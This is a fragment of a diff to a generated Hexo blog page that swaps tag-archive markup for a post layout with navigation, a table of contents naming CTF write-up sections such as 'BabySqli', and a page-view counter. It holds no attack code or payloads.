+    <a href="/2020/02/02/CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%8F%90%E9%AB%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF从入门到提高</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%8F%90%E9%AB%98/">CTF从入门到提高</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#枯燥的抽奖"><span class="toc-number">1.1.</span> <span class="toc-text">枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabySqli"><span class="toc-number">1.2.</span> <span class="toc-text">BabySqli</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2020-02-02T05:13:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/CTF%E9%A2%98%E7%9B%AE%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">CTF题目靶机练习</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+            阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
 
 
           </div>
@@ -299,9 +568,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
